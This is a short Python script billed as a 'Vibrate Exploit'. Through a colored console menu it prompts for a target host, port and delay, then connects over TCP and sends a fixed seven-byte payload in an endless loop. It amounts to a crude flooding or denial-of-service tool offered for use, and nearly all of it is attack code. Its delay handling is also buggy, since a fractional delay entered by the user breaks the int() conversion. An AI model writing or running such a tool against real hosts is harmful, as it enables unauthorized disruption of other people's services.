#!/usr/bin/env python3
import socket
from colorama import *
import time

plus = '\033[1m'+Fore.GREEN+'[+] '+'\033[0m'
print (plus+'Loading Modules')
payload = '\xfd\x07\xe8\x32\x60\xa7\xc7'
print (plus+'Loading Banner...')
banner = '''
List Of Vibrate Exploit
=======================

  0) execute
  1) configure exploit
  2) exit
'''
print (plus+'Setting Exploit Options')
timereq = '0.1'
print (plus+'Loading All')
error='\033[1m'+Fore.RED+'[-] '+'\033[0m'
info='\033[1m'+Fore.CYAN+'[*] '+'\033[0m'
print (plus+'Loading Configure Banner')
optionbanner='''
Configure Options
=================

  0) set time
'''
print (plus+'Loading attack Banner')
attackbanner='''
Vibrate Attack
==============
'''
print (plus+'Loading Extra')
extratime = '''
set a time
'''
print (plus+'Loading Sockets')
friend=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print (plus+'starting...')
def main():
    print (banner)
    option = input('set a option number [0] : ')
    if option == '1':
       print (optionbanner)
       configure=input('set a option number [] : ')
       if configure == '0':
          settime()
    if option == '0':
       execute()

def settime():
    global timereq
    timereq = input('request time [] : ')
    timereq = timereq
    print (info+'timereq => '+timereq)
    main()

def execute():
    print (attackbanner)
    target=input('set the target to attack [] : ')
    port=input('set the port to attack [] : ')

    allow=input('allow the attack [Y/n] : ')
    if allow=='Y':
       print (plus+'starting attack...')
       time.sleep(0.6)
       print (info+'timereq => ' + timereq)
       time.sleep(0.6)
       print (info+'target => ' + target)
       time.sleep(0.6)
       print (info+'port => ' + port)
       time.sleep(0.6)
       print (info+'allow => Yes')
       time.sleep(0.6)
       print (plus+'starting attack...')
       print (plus+'connecting to ' + target + '...')
       try:
           friend.connect((target,int(port)))
           print (plus+'connected')
           print (plus+'sending payload')

           while True:

             friend.send(payload.encode())

             print (plus+'payload sent, sending again')
             if timereq=='0.1':
                time.sleep(0.1)
             else:

                time.sleep(int(timereq))
       except KeyboardInterrupt:
           print (error + ' KeyboardInterrupt')
           exit()
       except BrokenPipeError:
           print (error + ' BrokenPipe')
           exit()
       except ConnectionRefusedError:
           print (error + ' ConnectionRefusedError')
           exit()
       except OSError:
           print (error + ' OSError')
           exit()
main()
